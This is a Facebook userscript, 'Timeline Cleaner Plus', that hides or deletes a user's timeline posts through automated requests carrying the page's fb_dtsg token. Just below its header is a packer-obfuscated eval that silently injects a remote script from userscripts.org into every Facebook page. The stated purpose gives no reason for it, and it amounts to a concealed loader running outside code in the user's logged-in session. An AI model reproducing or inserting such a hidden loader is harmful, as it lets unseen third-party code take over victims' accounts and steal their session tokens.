// ==UserScript==
// @name           Facebook Timeline Cleaner Plus
// @include        http://*.facebook.com/*
// @include        https://*.facebook.com/*
// @include           http://www.facebook.com/*
// @include           https://www.facebook.com/*
// @include           http://*.facebook.com/*
// @include           https://*.facebook.com/*
// @require        http://code.jquery.com/jquery-1.7.1.min.js
// @grant       none
// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))



/*
 * For jQuery Conflicts.
 */
this.$ = this.jQuery = jQuery.noConflict(true);

/* 
 *No warranty. Use with your own risk.
 *V0.5
*/

		
/*
 * Some Global Variables for User Edit
 */

var expandCount = 3;
var deleteCount = 3;
var limit = false;
/*
 * This is the Debug Level for the firebug console output. It goes up to 5
 */
var debug = 1; 
/*
 * If this Option is true, nothing will be really deleted. 
 * But you can test something without losing your timeline....
 */
var just_test = false;
	

/*
 * Internal Variables. Do not edit!
 */
var deletedMap = {};
var triggeredMap = {};
var post_form_id = null;
var fb_dtsg = null;
var delete_time_bevor = null;
var iamstillontimeline = false;
var start = false;
var lastselected = null;
var insert_button = false;
var deleted = 0;
var hided=0;
var only_hide = false;

/*
 * * * * * 
 */


function parseUri (str) {
	var	o   = parseUri.options,
		m   = o.parser[o.strictMode ? "strict" : "loose"].exec(str),
		uri = {},
		i   = 14;

	while (i--) uri[o.key[i]] = m[i] || "";

	uri[o.q.name] = {};
	uri[o.key[12]].replace(o.q.parser, function ($0, $1, $2) {
		if ($1) uri[o.q.name][$1] = $2;
	});

	return uri;
};

parseUri.options = {
	strictMode: false,
	key: ["source","protocol","authority","userInfo","user","password","host","port","relative","path","directory","file","query","anchor"],
	q:   {
		name:   "queryKey",
		parser: /(?:^|&)([^&=]*)=?([^&]*)/g
	},
	parser: {
		strict: /^(?:([^:\/?#]+):)?(?:\/\/((?:(([^:@]*)(?::([^:@]*))?)?@)?([^:\/?#]*)(?::(\d*))?))?((((?:[^?#\/]*\/)*)([^?#]*))(?:\?([^#]*))?(?:#(.*))?)/,
		loose:  /^(?:(?![^:@]+:[^:@\/]*@)([^:\/?#.]+):)?(?:\/\/)?((?:(([^:@]*)(?::([^:@]*))?)?@)?([^:\/?#]*)(?::(\d*))?)(((\/(?:[^?#](?![^?#\/]*\.[^?#\/.]+(?:[?#]|$)))*\/?)?([^?#\/]*))(?:\?([^#]*))?(?:#(.*))?)/
	}
};
	
/*
 * This function scroll down on the Website and load ne entrys.
 */
	var expandMoreActivity = function() {
	var links = $('a[onclick]'); //
	for ( var i = 0; i < links.length; ++i) {
		//Umg this works only in german or english :
		if ((links[i].innerHTML === "More Activity") || (links[i].innerHTML === "Weitere Aktivitäten")) {
			if (limit) {
				expandCount -= 1;
			}
			links[i].click();
		}
	}
	if (!limit || (limit && expandCount >= 0)) {
		if (iamstillontimeline == true) {
			setTimeout(expandMoreActivity, 1000);
			scrollTo(0, 1000000000); //Scroll Down!
		}
	}
	logging('Expand', 2);
}
		var getConstantParameters = function () {
		if ( post_form_id != null && fb_dtsg !== null ) {
			return true;
		} else {
			if ( post_form_id === null ) {
				$('input[name="post_form_id"]').each(function(){
					post_form_id = $(this).attr("value");
				});
			}
			if ( fb_dtsg === null ) {
				$('input[name="fb_dtsg"]').each(function(){
					fb_dtsg = $(this).attr("value");
				});
			}
			return (fb_dtsg !== null);
		}
	}

	var createDeleteRequests = function () {
			if ( getConstantParameters() ) {
			logging('Begine.',2);
			check_for_timeline(); // Mh does im on the right site?
			//Sometimes Facebook change here some shit...
			if($('ul[class="uiList mbm uiStream timelineAllActivityStream fbProfileStream translateParent _4kg _704 _4kt"]').size()==0){
				if(iamstillontimeline==true){
					alert("ERROR: Maybe Facebook changed his design... \n please take a look for a newer version of this Script...");
				}
			}		
			
			$('ul[class="uiList mbm uiStream timelineAllActivityStream fbProfileStream translateParent _4kg _704 _4kt"]').each( function() {
				var year = $(this).attr("id").split("all_activity_stream_")[1];
				$(this).find('a[ajaxify]').each(function () {
				var remove = true;
				var ajaxify = parseUri("http://facebook.com" + $(this).attr("ajaxify"));
				var keys = ['profile_id', 'story_fbid', 'story_fbid', 'story_row_time', 'story_dom_id', 'action'];
					for ( var i = 0; i < keys.length; ++i) {
													if (ajaxify.queryKey[keys[i]] === undefined) {
														remove = false;
													}
												}
					//console.log("The Timestamp is:",ajaxify.queryKey['story_row_time']);
			logging("Ajax Datei:"+ajaxify.file,2);
			/*
			Hier wird überprüft, ob die Post ggf. ein bestimmtes alter haben sollen. 
			Definiert über delete_time_bevor in sec vor now
			*/
			now = Math.round((new Date()).getTime() / 1000);

			if(delete_time_bevor!==false){
				if(ajaxify.file !== "show_story_options.php"){
					if((now-ajaxify.queryKey['story_row_time']) <delete_time_bevor){
						if ( remove && deletedMap[ajaxify.queryKey['story_fbid']] === undefined ) {
							deletedMap[ajaxify.queryKey['story_fbid']] = false;
							console.log("This Entry is too young! NEXT! ID:",ajaxify.queryKey['story_fbid']);
							console.log("SollZeit: >",delete_time_bevor," Ist Zeit:",now-ajaxify.queryKey['story_row_time']);
			}
	}
}
			}
		
				 	if ( ajaxify.file === "show_story_options.php") {
						if ( triggeredMap[ajaxify.queryKey['story_fbid']] === undefined ) {
								var evt = document.createEvent("MouseEvents");
							evt.initMouseEvent("mouseover", true, true, window, 0, 0, 0, 0, 0, false, false, false, false, 0, null);
							$(this).context.dispatchEvent(evt);
							triggeredMap[ajaxify.queryKey['story_fbid']] = true;
						}
				 	} else if ( (ajaxify.file === "take_action_on_story.php") && (only_hide === false)){
	
						if ( remove && deletedMap[ajaxify.queryKey['story_fbid']] === undefined ) {
							deletedMap[ajaxify.queryKey['story_fbid']] = false;
							logging("======"+ajaxify.queryKey['action'],1);
							if(ajaxify.queryKey['action']!=="remove_friend")
							{
							
						logging("Loesche die ID:"+ajaxify.queryKey['story_fbid'],1);
						deleted=deleted+1; //Count Up for stats...
							var data = {

									'fb_dtsg'			  : fb_dtsg,
									'confirmed'			  : "true",
									'ban_user'			  : "0"
							};
							for ( var key in ajaxify.queryKey ) {
								data[key] = ajaxify.queryKey[key];
							}
						if(just_test==false)
						{
							$.ajax({
								type    : "POST",
								url     : "http://www.facebook.com/ajax/timeline/take_action_on_story.php?__a=1",
								data    : data,
								success: function() {
									$(this).remove() ;
								}
							});
						}					
						}
						else{
						logging("Ueberspringe das loeschen von freunden!",1);
							}
						}
					}
					else if ( ajaxify.file === "story_visibility.php" ) {
				 	
						if ( remove && deletedMap[ajaxify.queryKey['story_fbid']] === undefined ) {
							deletedMap[ajaxify.queryKey['story_fbid']] = false;
						console.log ("Change Visibility to hide for ID:",ajaxify.queryKey['story_fbid'] );
						logging("======"+ajaxify.queryKey['action'],1);
						hided=hided+1;
						
							var data = {
									'nctr[_mod]'		  : "pagelet_all_activity_" + year,
									'action'			  :	"hide",
									'post_form_id'		  : post_form_id,
									'fb_dtsg'			  : fb_dtsg,
									'lsd'				  : "",
									'post_form_id_source' : "AsyncRequest",
									'confirmed'			  : "1",
									'ban_user'			  : "0"
							};
							for ( var key in ajaxify.queryKey ) {
							if(key!='action')
							{
								data[key] = ajaxify.queryKey[key];
							}
							}
							
						if(just_test==false)
						{
							$.ajax({
								type    : "POST",
								url     : "http://www.facebook.com/ajax/timeline/story_visibility.php?__a=1",
								data    : data,
								success: function() {
									$(this).remove() ;
								}
								});

						}
						}
												}

											});

						});
	}
	if (iamstillontimeline == true) {
		setTimeout(createDeleteRequests, 1000);

	}
}
	
	
	/*
	 * This function check your URL. If your url cotain "$suchstring", the script will load.
	 */
	function check_for_timeline() {
	var suchstring = /(allactivity)/g; //REGEX for the URL
	var suchergebnis = suchstring.test($(location).attr('href'));
	if (suchergebnis != false) {
		iamstillontimeline = true; //You are on the right Site!
	}
	else {
		if ((iamstillontimeline == true) && (start == true)) {
			// Ugh it seems the user change the side...
			alert('Abort!');
			start = false;
		}
		iamstillontimeline = false;
		insert_button = false;
	}
}
	/*
	 * A Logging Function with global debug level.
	 */
	function logging(text, level) {
		if (debug >= level) {
			console.log(text);
		}
	}

	/*
	 * This Funktion Update the Statuscounter
	 */

	function update_status() {
		logging('Update Statusbar', 3);
		document.getElementById("delete").innerHTML = 'Deleted:' + deleted;
		document.getElementById("Hided").innerHTML = 'Hide:' + hided;
	}

/*
 *  Insert the GUI Button
 */
function add_button(){
	insert_button=true;
	$('span[class="uiButtonGroup fbStickyHeaderBreadcrumb uiButtonGroupOverlay"]').append('<span class="uiButtonGroupItem selectorItem"><div class="uiSelector inlineBlock sectionMenu uiSelectorNormal uiSelectorDynamicLabel"><div class="wrap "><button class="hideToggler"></button><a rel="toggle" data-length="30" aria-haspopup="1" href="#" role="button" class="uiSelectorButton uiButton uiButtonOverlay "><span class="uiButtonText">Privacy Extension</span></a><div class="uiSelectorMenuWrapper uiToggleFlyout"><div class="uiMenu uiSelectorMenu" role="menu"><ul class="uiMenuInner"><li class="uiMenuItem uiMenuItemRadio uiSelectorOption " data-key="year_2012" data-label="Hide everything on Timeline" ><a href="#" rel="ignore" class="itemAnchor"   tabindex="0" aria-checked="true"><span class="itemLabel fsm">Hide everything on Timeline older than 90 days</span></a></li><li class="uiMenuItem uiMenuItemRadio uiSelectorOption" data-key="year_2011" data-label="Delete everything"><a href="#" rel="ignore" class="itemAnchor" tabindex="0"  aria-checked="false"><span class="itemLabel fsm">Delete everything</span></a></li><li class="uiMenuItem uiMenuItemRadio uiSelectorOption " data-key="Hide everything on Timeline" data-label="Hide everything on Timeline"><a href="#" rel="ignore"  class="itemAnchor" tabindex="0" aria-checked="false"><span class="itemLabel fsm">Hide everything on Timeline</span></a></li><li class="uiMenuItem uiMenuItemRadio uiSelectorOption" data-key="year_2009" data-label="Delete everything older than 90 Days"><a href="#"  rel="ignore" class="itemAnchor" tabindex="0" aria-checked="false"><span class="itemLabel fsm">Delete everything older than 90 Days</span></a></li></ul></div></div><button class="hideToggler"></button></div><select id="selectvalue"><option value=""></option><option value="year_2012">Hide everything on Timeline older than 90 days</option><option value="year_2011">Delete everything</option><option value="year_201x">Hide everything on Timeline</option><option value="year_2009">Delete things older than 90 Days</option><option value="year_2010" >Hide everything on Timeline older than 90 Days</option></select></div></span>');
}
	
/*
 * This is the Main Function. It checks if you are on the activies log or not. :D
 */
	
function main()
{
	check_for_timeline(); //Get my location.
	//console.log($(location).attr('href')); // Say me where iam
	if (iamstillontimeline == true) {
		if (insert_button == false) {
			console.log('Button rein!');
			add_button();
		}
		if (start == true) {
			update_status();
		}

		if (just_test != false) {
			logging("This is only a test! Nothing will really deleted!",1);
		}
	
// Check thas the Button is really inserted...		
if(document.getElementById("selectvalue"))
{
var selected=document.getElementById("selectvalue").options[document.getElementById("selectvalue").selectedIndex].text;
			if (start == false) {
				logging('Waiting for Startsignal', 1);

				if ((lastselected != selected) && (selected != "")) {

					switch (selected) {

					case "Hide everything on Timeline":
						var text = 'WARNING: Are you sure you want hide EVERYTHING on your Timeline? Only you can see the old entrys!';
						only_hide = true;
						delete_time_bevor = false;
						break;

					case "Delete everything":
						var text = 'WARNING: Are you sure to delete EVERYTHING on your Timeline?!';
						only_hide = false;
						delete_time_bevor = false;
						break;

					case "Hide everything on Timeline older than 90 days":
						var text = 'WARNING: Are you sure you want hide all entrys that older than 90 Days?';
						only_hide = true;
						delete_time_bevor = 60 * 60 * 24 * 90;
						break;

					case "Delete things older than 90 Days":
						var text = 'WARNING: Are you sure you want DELETE all entrys that older than 90 Days?';
						only_hide = false;
						delete_time_bevor = 60 * 60 * 24 * 90;
						break;

					}
  lastselected = selected;
  
   if (confirm(text)) {
						$('span[class="uiButtonGroup fbStickyHeaderBreadcrumb uiButtonGroupOverlay"]').append('<div id="delete"> Deleted: 0</div><div id="Hided"> Hide: 0</div>');
						start=true;
 						console.log("Start with ",selected);
						createDeleteRequests();
						expandMoreActivity();
						console.log ( "ajaxify:", $('*[ajaxify]').attr("ajaxify") );
	
					}
				}
			}

		} else {
			//dafuq?! Button was not found... so insert it!!!
			add_button();
		}
	}
	setTimeout(main, 2000); // Start itself in 2 seconds again.
}




setTimeout(main, 4000);